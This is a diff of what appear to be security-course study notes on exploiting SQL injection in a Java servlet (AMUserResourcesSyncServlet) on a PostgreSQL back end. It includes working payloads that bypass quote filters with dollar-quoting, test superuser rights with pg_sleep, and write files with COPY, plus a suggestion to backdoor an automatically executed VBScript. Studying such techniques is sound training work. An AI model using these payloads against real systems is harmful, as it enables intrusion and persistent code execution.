@@ -15,5 +15,5 @@ Java web applications use a deployment descriptor file named **`web.xml`** to de
 - if the app filters the quotes `'`, PostgreSQL supports `$$` (dollar-quoting) as a replacement for single quotes (`'`) to simplify writing strings that contain literal quotes.
 - The attacker tests a SQL injection vulnerability to confirm DBA privileges by using a payload that checks if `current_setting('is_superuser')` returns `"on"`. If true, it triggers a 10-second delay via `pg_sleep(10)`, confirming administrative access. `/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+`
 - Use SQLI to write to the file system `/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;COPY+(SELECT+$$offsec$$)+to+$$c:\\offsec.txt$$;--+`
-- Invistige if VB scripts are being executed after performaing some action (Creating a Monitor in our case) via ProcMon. If we have ability to write to the file system, we can inject a backdoor into this VB script and it will be executed automatically by the application.
+- Invistige if any VB scripts are being executed after performaing some action (Creating a Monitor in our case) via ProcMon. If we have ability to write to the file system, we can inject a backdoor into this VB script and it will be executed automatically by the application.
 - 
